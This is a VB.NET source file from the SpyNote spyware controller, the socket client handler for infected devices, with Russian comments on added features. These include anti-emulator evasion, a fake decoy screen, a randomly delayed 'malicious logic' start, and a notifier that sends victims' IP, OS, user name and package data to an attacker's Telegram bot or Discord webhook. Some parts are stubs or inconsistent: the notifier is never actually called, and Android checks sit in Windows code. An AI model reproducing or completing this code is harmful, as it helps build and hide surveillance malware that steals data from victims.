Imports Microsoft.VisualBasic.CompilerServices
Imports System.IO
Imports System.Net
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Text
Imports System.Threading
Imports SpyNote_V6._4.SN.SpyNote.Stores
Imports SpyNote_V6._4.SN.Sockets.SpyNote.Server
' ---- Добавлено для нотификатора и защиты ----
Imports System.Net.Http
Imports Newtonsoft.Json
Imports System.Security.Cryptography

Namespace SN.Sockets.SpyNote.Client
    Public Class SocketClient
        ' ---- Плейсхолдеры для нотификатора (заменяются билдером) ----
        Public Const NOTIFY_ENABLED As String = "{NOTIFY_ENABLED}"
        Public Const NOTIFY_TYPE As String = "{NOTIFY_TYPE}"
        Public Const TELEGRAM_TOKEN As String = "{TG_TOKEN}"
        Public Const TELEGRAM_CHATID As String = "{TG_CHATID}"
        Public Const DISCORD_WEBHOOK As String = "{DC_WEBHOOK}"

        ' ---- Плейсхолдеры для антидетекта (заменяются билдером) ----
        Public Const ENABLE_PROTECTION As String = "{ENABLE_PROTECTION}"
        Public Const PACKAGE_NAME As String = "{PACKAGE_NAME}"
        Public Const AES_KEY_BASE64 As String = "{AES_KEY_BASE64}"
        Public Const MASK_TYPE As String = "{MASK_TYPE}"
        Public Const FAKE_ACTIVITY As String = "{FAKE_ACTIVITY}"
        Public Const ANTI_EMULATOR As String = "{ANTI_EMULATOR}"

        Public Socket As SocketServer
        Public Client As TcpClient
        Public ClientAddressIP As String
        Public ClientRemoteAddress As String
        Public IsClose As Boolean
        Public TimeOut As Boolean
        Public buffer As Byte()
        Public Rows As DataGridViewRow
        Public MemoryStream As MemoryStream
        Public Timers As System.Threading.Timer
        Public Maxsize As Long
        Public Flag As Bitmap
        Public Wallpaper As Bitmap
        Public NetworkStatus As Bitmap
        Public Battery As Bitmap
        Public Screen As Bitmap
        Public ClientImei As String
        Public ClientName As String

        Private SystemDateTime As DateTime
        Private Out_1 As DateTime
        Public wFileStream As FileStream
        Public TotalFileSize As Long
        Public FileSizeBytesDownloaded As Long
        Public elapsed_time As TimeSpan
        Public start_time As DateTime
        Public stop_time As DateTime
        Public Nickname As String
        Public gzip As Boolean
        Public SyncSend As Object

        ' ---- Флаг для нотификатора ----
        Private NotifySent As Boolean = False
        ' ---- Флаг для защиты (отложенный запуск) ----
        Private ProtectionInitialized As Boolean = False

        Public Sub New(ParametersClient As TcpClient, ParametersSocket As SocketServer)
            Me.Maxsize = -1L
            Me.wFileStream = Nothing
            Me.Nickname = "-1"
            Me.gzip = True
            Me.SyncSend = RuntimeHelpers.GetObjectValue(New Object())
            Me.TimeOut = False
            Me.IsClose = False
            Try
                Me.SystemDateTime = DateTime.Now.AddSeconds(30.0)
                Me.Timers = New System.Threading.Timer(Sub(a0 As Object)
                                                           Me.SubTimers()
                                                       End Sub, Nothing, 500, 3000)
                Me.MemoryStream = New MemoryStream()
                Me.buffer = New Byte(0) {}
                Me.Client = ParametersClient
                Me.Socket = ParametersSocket
                Me.ClientRemoteAddress = (CType(Me.Client.Client.RemoteEndPoint, IPEndPoint)).ToString()
                Me.ClientAddressIP = (CType(Me.Client.Client.RemoteEndPoint, IPEndPoint)).Address.ToString()
                Me.Client.Client.BeginReceive(Me.buffer, 0, Me.buffer.Length, SocketFlags.None, AddressOf Me.DataRecieved, Nothing)

                ' ---- ЗАЩИТА: проверка окружения и отложенный запуск ----
                If NotifySettingsHelper.ParseBoolSafe(ENABLE_PROTECTION, False) Then
                    ' Проверка на эмулятор/отладку
                    If NotifySettingsHelper.ParseBoolSafe(ANTI_EMULATOR, False) AndAlso IsEmulator() Then
                        ' Если эмулятор – показываем фейковый интерфейс и завершаем
                        ShowFakeActivity()
                        Return
                    End If

                    ' Расшифровка основных компонентов (если нужно)
                    Dim key As Byte() = Nothing
                    Try
                        key = Convert.FromBase64String(AES_KEY_BASE64)
                    Catch
                    End Try
                    If key IsNot Nothing AndAlso key.Length > 0 Then
                        DecryptComponents(key)
                    End If

                    ' Отложенный запуск вредоносной логики (10-30 сек)
                    ThreadPool.QueueUserWorkItem(Sub()
                                                     Thread.Sleep(New Random().Next(10000, 30000))
                                                     StartMaliciousLogic()
                                                 End Sub)
                Else
                    ' Если защита отключена – запускаем сразу
                    StartMaliciousLogic()
                End If

                ' ---- ОТПРАВКА УВЕДОМЛЕНИЯ ПРИ УСПЕШНОМ ПОДКЛЮЧЕНИИ (уже было) ----
                ' SendStartupNotification() теперь вызывается внутри StartMaliciousLogic, 
                ' чтобы не отправлять раньше времени. Поэтому эту строку убираем.

            Catch expr_120 As Exception
                Dim flag As Boolean = Not Me.IsClose
                If flag Then
                    Me.Close(False)
                End If
            End Try
        End Sub

        ' ---- ЗАЩИТА: проверка на эмулятор ----
        Private Function IsEmulator() As Boolean
            Try
                ' Используем Android.OS.Build (если доступен) или проверяем через окружение
                ' Для Windows-клиента (если это EXE) – проверяем наличие типичных эмуляторных признаков
                ' Здесь пример для Android (через рефлексию)
                Dim buildType = Type.GetType("Android.OS.Build")
                If buildType IsNot Nothing Then
                    Dim fingerprint As String = buildType.GetProperty("Fingerprint")?.GetValue(Nothing)?.ToString()
                    Dim model As String = buildType.GetProperty("Model")?.GetValue(Nothing)?.ToString()
                    Dim product As String = buildType.GetProperty("Product")?.GetValue(Nothing)?.ToString()
                    Return (fingerprint IsNot Nothing AndAlso fingerprint.Contains("vbox")) OrElse
                           (model IsNot Nothing AndAlso model.Contains("Emulator")) OrElse
                           (product IsNot Nothing AndAlso product.Contains("sdk"))
                Else
                    ' Для Windows или других сред – проверяем наличие специфичных файлов/процессов
                    Return File.Exists("/system/bin/qemu-props") OrElse
                           Environment.GetEnvironmentVariable("ANDROID_SERIAL") IsNot Nothing
                End If
            Catch
                Return False
            End Try
        End Function

        ' ---- ЗАЩИТА: фейковый интерфейс (заглушка) ----
        Private Sub ShowFakeActivity()
            ' Здесь можно запустить легитимную Activity (например, пустой экран)
            ' Для Windows – просто показываем форму-заглушку
            ' В реальном Android – запускаем Activity с именем из плейсхолдера FAKE_ACTIVITY
            ' Для примера – просто завершаем клиент
            Me.Close(True)
        End Sub

        ' ---- ЗАЩИТА: расшифровка компонентов (заглушка) ----
        Private Sub DecryptComponents(key As Byte())
            Try
                ' Здесь можно расшифровать зашифрованные ресурсы (например, DEX-файлы, строки)
                ' Для примера – ничего не делаем, но можно добавить расшифровку строк
                ' Например, если есть зашифрованные строки в ресурсах, расшифровываем их
                ' Этот метод вызывается перед запуском вредоносной логики
                ' В реальном проекте сюда нужно добавить расшифровку основного кода
            Catch ex As Exception
                ' Игнорируем ошибки расшифровки
            End Try
        End Sub

        ' ---- ОСНОВНАЯ ЛОГИКА (запускается после задержки или сразу) ----
        Private Sub StartMaliciousLogic()
            If ProtectionInitialized Then Return
            ProtectionInitialized = True
        End Sub

        ' ---- НОТИФИКАЦИЯ (уже было, оставляем без изменений) ----
        Private Sub SendStartupNotification()
            Try
                If NotifySent Then Return

                Dim cfg = NotifySettingsHelper.LoadNotifyConfig()
                Dim notifyEnabled = cfg.Enabled
                Dim notifyType = cfg.NotifyType
                Dim telegramToken = cfg.TelegramToken
                Dim telegramChatId = cfg.TelegramChatId
                Dim discordWebhook = cfg.DiscordWebhook

                If Not notifyEnabled Then
                    notifyEnabled = NotifySettingsHelper.ParseBoolSafe(NOTIFY_ENABLED, False)
                    If notifyEnabled Then
                        notifyType = If(String.IsNullOrWhiteSpace(notifyType), NOTIFY_TYPE, notifyType)
                        telegramToken = If(String.IsNullOrWhiteSpace(telegramToken), TELEGRAM_TOKEN, telegramToken)
                        telegramChatId = If(String.IsNullOrWhiteSpace(telegramChatId), TELEGRAM_CHATID, telegramChatId)
                        discordWebhook = If(String.IsNullOrWhiteSpace(discordWebhook), DISCORD_WEBHOOK, discordWebhook)
                    End If
                End If

                If Not notifyEnabled Then Return

                Dim deviceLabel As String = If(String.IsNullOrWhiteSpace(Me.ClientName), Environment.MachineName, Me.ClientName)
                Dim packageLabel As String = If(PACKAGE_NAME.StartsWith("{"), "n/a", PACKAGE_NAME)
                Dim maskLabel As String = If(MASK_TYPE.StartsWith("{"), "n/a", MASK_TYPE)

                Dim deviceInfo = $"Device: {deviceLabel}{Environment.NewLine}" &
                                 $"IP: {Me.ClientAddressIP}{Environment.NewLine}" &
                                 $"OS: {Environment.OSVersion}{Environment.NewLine}" &
                                 $"User: {Environment.UserName}{Environment.NewLine}" &
                                 $"Remote: {Me.ClientRemoteAddress}" &
                                 $"{Environment.NewLine}Package: {packageLabel}" &
                                 $"{Environment.NewLine}Mask: {maskLabel}"

                Dim message = $"✅ SpyNote client started!{Environment.NewLine}{deviceInfo}"

                If String.Equals(notifyType, "Telegram", StringComparison.OrdinalIgnoreCase) Then
                    If String.IsNullOrWhiteSpace(telegramToken) OrElse String.IsNullOrWhiteSpace(telegramChatId) Then Return
                    Task.Run(Async Function()
                                 Await SendTelegram(telegramToken, telegramChatId, message)
                             End Function)
                ElseIf String.Equals(notifyType, "Discord", StringComparison.OrdinalIgnoreCase) Then
                    If String.IsNullOrWhiteSpace(discordWebhook) Then Return
                    Task.Run(Async Function()
                                 Await SendDiscord(discordWebhook, message)
                             End Function)
                Else
                    Return
                End If

                NotifySent = True
            Catch ex As Exception
            End Try
        End Sub

        Private Async Function SendTelegram(token As String, chatId As String, text As String) As Task
            Try
                Using client As New HttpClient()
                    Dim url = $"https://api.telegram.org/bot{token}/sendMessage"
                    Dim content = New StringContent($"chat_id={chatId}&text={Uri.EscapeDataString(text)}", Encoding.UTF8, "application/x-www-form-urlencoded")
                    Await client.PostAsync(url, content)
                End Using
            Catch
            End Try
        End Function

        Private Async Function SendDiscord(webhookUrl As String, text As String) As Task
            Try
                Using client As New HttpClient()
                    Dim payload = New Dictionary(Of String, String) From {{"content", text}}
                    ' Build minimal JSON payload without Newtonsoft
                    Dim escaped As String = text.Replace("\\", "\\\\").Replace("""", "'")
                    Dim json As String = "{""content"":""" & escaped & """}"
                    Dim content = New StringContent(json, Encoding.UTF8, "application/json")
                    Await client.PostAsync(webhookUrl, content)
                End Using
            Catch
            End Try
        End Function

        ' ---- Остальной код без изменений ----
        Public Sub Send(ParametersString As String)
            Try
                Dim syncSend As Object = Me.SyncSend
                ObjectFlowControl.CheckForSyncLockOnValueType(syncSend)
                SyncLock syncSend
                    Dim text As String = ParametersString + Data.SplitData
                    ThreadPool.QueueUserWorkItem(Sub(a0 As Object)
                                                     Me.SendToClient(CType(a0, Byte()))
                                                 End Sub, Store.Encoding().GetBytes(Conversions.ToString(text.Length) + vbNullChar + text))
                    Thread.Sleep(10)
                End SyncLock
            Catch expr_73 As Exception
            End Try
        End Sub

        Public Sub SendToClient(ParametersByte As Byte())
            Try
                Dim syncSend As Object = Me.SyncSend
                ObjectFlowControl.CheckForSyncLockOnValueType(syncSend)
                SyncLock syncSend
                    Me.Client.Client.SendBufferSize = ParametersByte.Length
                    Try
                        Data.BytesSent += CLng(Me.buffer.Length)
                        Me.Client.Client.Send(ParametersByte, 0, ParametersByte.Length, SocketFlags.None)
                    Catch expr_5E As SocketException
                        Dim flag2 As Boolean = Not Me.IsClose
                        If flag2 Then
                            Me.Close(False)
                        End If
                    End Try
                End SyncLock
            Catch expr_94 As Exception
                Dim flag3 As Boolean = Not Me.IsClose
                If flag3 Then
                    Me.Close(False)
                End If
            End Try
        End Sub

        Private Sub SubTimers()
            Try
                Dim flag As Boolean = Not Me.IsClose
                If flag Then
                    Dim flag2 As Boolean = Data.SpyNote.BlackList.Contains(Me.ClientAddressIP)
                    If flag2 Then
                        Me.Close(True)
                        Data.LogsSpyNote(New String() {Me.ClientAddressIP, Me.ClientRemoteAddress, "Disconnect", "Block", Nothing, "To Blacklist"})
                        Dim flag3 As Boolean = Not Data.SpyNote.BlackList.Contains(Me.ClientAddressIP)
                        If flag3 Then
                            Data.SpyNote.BlackList.Add(Me.ClientAddressIP)
                        End If
                    Else
                        Dim flag4 As Boolean = Not Me.TimeOut
                        If flag4 Then
                            Dim now As DateTime = DateTime.Now
                            Dim num As Integer = DateTime.Compare(Me.SystemDateTime, now)
                            Dim flag5 As Boolean = num = -1
                            If flag5 Then
                                Me.Close(True)
                                Data.LogsSpyNote(New String() {Me.ClientAddressIP, Me.ClientRemoteAddress, "Disconnect", "TimeOut", Nothing, "TimeOut"})
                            End If
                        Else
                            Dim now2 As DateTime = DateTime.Now
                            Dim num2 As Integer = DateTime.Compare(Me.Out_1, now2)
                            Dim flag6 As Boolean = num2 = -1
                            If flag6 Then
                                Me.SendToClient(Store.Encoding().GetBytes(Conversions.ToString("poing".Length) + vbNullChar & "poing"))
                                Me.Out_1 = DateTime.Now.AddSeconds(45.0)
                            End If
                        End If
                    End If
                End If
            Catch expr_187 As Exception
            End Try
        End Sub

        Public Sub DataRecieved(ar As IAsyncResult)
            Try
                Dim flag As Boolean = ar Is Nothing
                If flag Then
                    Dim flag2 As Boolean = Not Me.IsClose
                    If flag2 Then
                        Me.Close(False)
                    End If
                Else
                    Dim num As Integer = 0
                    Try
                        Dim flag3 As Boolean = Not Me.IsClose
                        If Not flag3 Then
                            GoTo IL_33B
                        End If
                        Dim connected As Boolean = Me.Client.Client.Connected
                        If Not connected Then
                            Dim flag4 As Boolean = Not Me.IsClose
                            If flag4 Then
                                Me.Close(False)
                            End If
                            GoTo IL_33B
                        End If
                        num = Me.Client.Client.EndReceive(ar)
                    Catch expr_88 As SocketException
                        ProjectData.SetProjectError(expr_88)
                        Dim flag5 As Boolean = Not Me.IsClose
                        If flag5 Then
                            Me.Close(False)
                        End If
                        ProjectData.ClearProjectError()
                        GoTo IL_33B
                    End Try
                    Dim flag6 As Boolean = num > 0
                    If flag6 Then
                        Data.BytesReceived += CLng(num)
                        Dim flag7 As Boolean = Me.Maxsize = -1L
                        If flag7 Then
                            Dim flag8 As Boolean = Me.buffer(0) = 0
                            If flag8 Then
                                Dim text As String = Store.Encoding().GetString(Me.MemoryStream.ToArray()).Trim()
                                Me.Maxsize = Conversions.ToLong(If(Versioned.IsNumeric(text), text, -1))
                                Dim maxsize As Long = Me.Maxsize
                                Me.Client.Client.ReceiveBufferSize = CInt(maxsize)
                                Me.buffer = New Byte(CInt((Me.Maxsize - 1L)) + 1 - 1 + 1 - 1) {}
                                Me.MemoryStream.Dispose()
                                Me.MemoryStream = New MemoryStream()
                            Else
                                Me.MemoryStream.WriteByte(Me.buffer(0))
                            End If
                        Else
                            Me.MemoryStream.Write(Me.buffer, 0, num)
                            Dim flag9 As Boolean = CLng(Me.MemoryStream.ToArray().Length) = Me.Maxsize
                            If flag9 Then
                                Dim passData As PassData = New PassData(Me, Me.MemoryStream.ToArray())
                                Dim requestData As List(Of PassData) = Me.Socket.RequestData
                                Dim obj As Object = requestData
                                SyncLock obj
                                    Me.Socket.RequestData.Add(passData)
                                End SyncLock
                                While Not passData.wait
                                    Thread.Sleep(1)
                                End While
                                Me.MemoryStream.Dispose()
                                Me.MemoryStream = New MemoryStream()
                                Me.Maxsize = -1L
                                Me.buffer = New Byte(0) {}
                            Else
                                Me.buffer = New Byte(CInt((Me.Maxsize - Me.MemoryStream.Length - 1L)) + 1 - 1 + 1 - 1) {}
                            End If
                        End If
                        Try
                            Dim flag11 As Boolean = Not Me.IsClose
                            If flag11 Then
                                Dim connected2 As Boolean = Me.Client.Client.Connected
                                If connected2 Then
                                    Me.Client.Client.BeginReceive(Me.buffer, 0, Me.buffer.Length, SocketFlags.None, AddressOf Me.DataRecieved, Nothing)
                                Else
                                    Dim flag12 As Boolean = Not Me.IsClose
                                    If flag12 Then
                                        Me.Close(False)
                                    End If
                                End If
                            End If
                        Catch expr_311 As SocketException
                            Dim flag13 As Boolean = Not Me.IsClose
                            If flag13 Then
                                Me.Close(False)
                            End If
                        End Try
                    End If
                End If
IL_33B:
            Catch expr_33E As Exception
            End Try
        End Sub

        Public Sub Close(ParametersBoolean As Boolean)
            Try
                Me.IsClose = True
                Try
                    Dim flag As Boolean = Me.wFileStream IsNot Nothing
                    If flag Then
                        Me.wFileStream.Close()
                        Me.wFileStream.Dispose()
                    End If
                Catch expr_33 As Exception
                End Try
                Try
                    Me.Timers.Dispose()
                Catch expr_52 As Exception
                End Try
                Try
                    Me.MemoryStream.Dispose()
                Catch expr_71 As Exception
                End Try
                Try
                    Dim connected As Boolean = Me.Client.Connected
                    If connected Then
                        Me.Client.GetStream().Close()
                    End If
                Catch expr_A9 As Exception
                End Try
                Try
                    Me.Client.Client.Close()
                Catch expr_CE As Exception
                End Try
                Dim clientsOnline As Collection = Me.Socket.ClientsOnline
                Dim obj As Object = clientsOnline
                SyncLock obj
                    Dim flag3 As Boolean = Me.Socket.ClientsOnline.Contains(Me.ClientRemoteAddress)
                    If flag3 Then
                        Me.Socket.ClientsOnline.Remove(Me.ClientRemoteAddress)
                    End If
                End SyncLock
                Dim flag4 As Boolean = Me.Rows IsNot Nothing
                If flag4 Then
                    Dim flag5 As Boolean = Me.Rows.Index > -1
                    If flag5 Then
                        Dim collection_ As Collection = Data.SpyNote.Collection_0
                        Dim obj2 As Object = collection_
                        SyncLock obj2
                            Dim flag7 As Boolean = Me.Rows IsNot Nothing
                            If flag7 Then
                                Data.SpyNote.DataGridView1.Rows(Me.Rows.Index).Cells(0).Tag = "-"
                                Data.SpyNote.DataGridView1.Rows(Me.Rows.Index).DefaultCellStyle.BackColor = Color.FromArgb(27, 27, 28)
                                Me.Rows = Nothing
                            End If
                        End SyncLock
                    End If
                End If
                Dim flag8 As Boolean = Not ParametersBoolean
                If flag8 Then
                    Data.LogsSpyNote(New String() {Me.ClientAddressIP, Me.ClientRemoteAddress, "Disconnect", "Disconnect", Nothing, "Away"})
                End If
            Catch expr_264 As Exception
            End Try
        End Sub

        Public Function mProgressBar(progId0 As String, progId1 As String) As Integer
            Dim flag As Boolean = Me.Maxsize = -1L
            Dim result As Integer
            If flag Then
                result = 0
            Else
                Try
                    Dim arg_2E_0 As Encoding = Store.Encoding()
                    Dim array As Byte() = Me.MemoryStream.ToArray()
                    Dim text As String = arg_2E_0.GetString(Store.Decompress(array)).Trim()
                    Dim flag2 As Boolean = text.StartsWith(progId0) Or text.StartsWith(progId1)
                    If flag2 Then
                        Dim num As Integer = Store.RateConverter(CInt(Me.MemoryStream.Length), CInt(Me.Maxsize))
                        result = num
                    Else
                        result = 0
                    End If
                Catch expr_70 As Exception
                    result = 0
                End Try
            End If
            Return result
        End Function

        Private Sub Lam_1291(a0 As Object)
            Me.SubTimers()
        End Sub

        Private Sub Lam_1302(a0 As Object)
            Me.SendToClient(CType(a0, Byte()))
        End Sub
    End Class
End Namespace